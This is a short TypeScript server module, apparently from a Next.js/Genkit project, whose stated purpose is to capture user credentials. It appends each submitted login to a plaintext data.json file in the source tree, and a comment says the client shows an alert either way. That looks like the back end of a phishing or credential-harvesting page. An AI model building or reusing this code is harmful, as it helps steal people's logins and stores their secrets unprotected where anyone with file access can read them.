'use server';
/**
 * @fileOverview A flow to capture user credentials and save them to a JSON file.
 *
 * - captureCredentialsFlow - A Genkit flow that receives and saves user credentials.
 */

import { ai } from '@/ai/genkit';
import type { CredentialsInput } from '@/ai/types/credentials';
import { CredentialsInputSchema } from '@/ai/types/credentials';
import * as fs from 'fs/promises';
import * as path from 'path';

export async function captureCredentials(input: CredentialsInput) {
  return await captureCredentialsFlow(input);
}

const captureCredentialsFlow = ai.defineFlow(
  {
    name: 'captureCredentialsFlow',
    inputSchema: CredentialsInputSchema,
    outputSchema: CredentialsInputSchema,
  },
  async (input: CredentialsInput) => {
    const dataFilePath = path.join(process.cwd(), 'src', 'ai', 'flows', 'data.json');

    try {
      // Read the existing data from the file
      let existingData: CredentialsInput[] = [];
      try {
        const fileContent = await fs.readFile(dataFilePath, 'utf-8');
        existingData = JSON.parse(fileContent);
        if (!Array.isArray(existingData)) {
          existingData = [];
        }
      } catch (readError: any) {
        // If the file doesn't exist, we'll create it.
        if (readError.code !== 'ENOENT') {
          console.error('Error reading data file:', readError);
        }
      }

      // Add the new credentials
      existingData.push(input);

      // Write the updated data back to the file
      await fs.writeFile(dataFilePath, JSON.stringify(existingData, null, 2), 'utf-8');
      
    } catch (error) {
      console.error('Error saving credentials to data.json:', error);
      // We will still return the input to the client to complete the flow.
      // The client-side logic is designed to show the alert regardless of success or failure.
    }

    // Return the input to signal completion to the client.
    return input;
  }
);
